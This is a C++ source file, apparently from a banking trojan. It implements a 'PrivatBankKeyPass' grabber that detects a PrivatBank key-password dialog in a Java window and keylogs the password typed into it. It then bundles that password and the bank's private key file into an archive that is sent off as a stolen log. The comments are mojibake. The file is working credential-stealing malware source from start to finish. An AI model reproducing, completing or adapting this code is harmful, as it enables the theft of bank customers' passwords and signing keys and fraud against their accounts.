
#pragma hdrstop

#include "PrivatBankKeyPass.h"
#include "JavaAppletGrabbers.h"
#include "WndUtils.h"
#include "UniversalKeyLogger.h"
#include "Strings.h"
#include "Utils.h"
#include "StrConsts.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace PPRIVATDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define PRVDBG PPRIVATDEBUGSTRINGS::DBGOutMessage<>


namespace  PrivatBankKeyPass
{


	const static char* PrivatBankKeyPassWndMask = "���� ������*";


	// ������������ ������
	DWORD PID = 0;
	TPrivatBankKeyPassword *Grabber = NULL;
	//------------------------------------------------


	//------------------------------------------------
	//  ShowWndHandler - ������������ ������� ��������
	//                   ����
	//------------------------------------------------
	void WINAPI ShowWndHandler(PKeyLogger, DWORD, LPVOID Data)
	{
		if (!Grabber) return;

		PShowWindowData SW = (PShowWindowData)Data;

		if (SW->Command == SW_HIDE && SW->Window == Grabber->Wnd())
		{
			// ��� �������� ���� ���������� ���
			Grabber->SendLog();
			delete Grabber;
			Grabber = NULL;
            KeyLogger::DisconnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
		}
	}



}



//------------------------------------------------
//  Initialize - ������� �������������� ������
//				 ������ ����� �����������
//------------------------------------------------
bool PrivatBankKeyPass::Initialize(HWND Wnd, DWORD  WndClassHash)
{
	if (WndClassHash != JAVAWND_SUNAWTDIALOG)
		return false;

	// ���������� ����� ����
	string Text = GetWndText(Wnd);
	if (!WildCmp(Text.t_str(), PrivatBankKeyPassWndMask))
		return false;

	if (IsNewProcess(PID))
	{
		// �������������� ����� � ����� ��������
    	Grabber = NULL;
    }

	if (!Grabber)
	{
		PRVDBG("PrivatKeyPass", "������ ������ ����� ����������� ���������������");

		Grabber = new TPrivatBankKeyPassword(Wnd, Text);

		// ������������ � �������� ����������� ����
		// ��� �������� ���� ��� ������� ������� ����
		KeyLogger::ConnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
	}

	return true;
}




//*****************************************************
//  ������ ������ ����� �����������
//*****************************************************

TPrivatBankKeyPassword::TPrivatBankKeyPassword(HWND aWnd, const string& WndText)
	: TGrabber(GetStr(EStrPrivatBankKeyPasswordGrabber))
{
	FWnd = aWnd;
	ConnectToKeyLogger();
	ParseFileName(WndText);
}

TPrivatBankKeyPassword::~TPrivatBankKeyPassword()
{

}

//------------------------------------------
//  ������� �������� ��� ����������
//------------------------------------------
void TPrivatBankKeyPassword::LogKeyboad(HWND aWnd, const char* Text)
{
	if (aWnd == FWnd)
		FPassword += Text;
}


//------------------------------------------
//  ������� ���������� ���
//------------------------------------------
bool TPrivatBankKeyPassword::SendLog()
{
	PRVDBG("PrivatKeyPass", "���������� ���\rPassword=%s", FPassword.t_str());
	if (FPassword.IsEmpty()) return false;

	LPVOID Cab = OpenCab();
	if (!Cab) return false;

	TBotStrings Fields;
	Fields.ValueDelimeter = ": ";
	Fields.AddValue(GetStr(EStrLogFieldPassword), FPassword);

	AddStringToCab(Cab, Fields.GetText(), GetStr(StrLogFileInformation));

	// ��������� ���� �����
	if (!FKeyFileName.IsEmpty())
	{
		string ShortName = GetStr(EStrLogKeyPath);
		ShortName += Slash;
		ShortName += File::ExtractFileNameA(FKeyFileName.t_str(), false);
		AddFileToCab(Cab, FKeyFileName.t_str(), ShortName.t_str());
	}

	// ��������� ��� � ���������� ���
	CloseCab(true);

	return true;
}

//------------------------------------------
//  ������� ��������� ��������� ����
//  � ������� ����� ����� �����
//------------------------------------------
void TPrivatBankKeyPassword::ParseFileName(const string& Text)
{
	PCHAR File = STRA::Scan(Text.t_str(), '"');
	if (!File) return;
	File++;
	PCHAR End = STRA::Scan(File, '"');
	if (!End) return;
	*End = 0;
	if (File::IsExists(File))
		FKeyFileName = File;
}
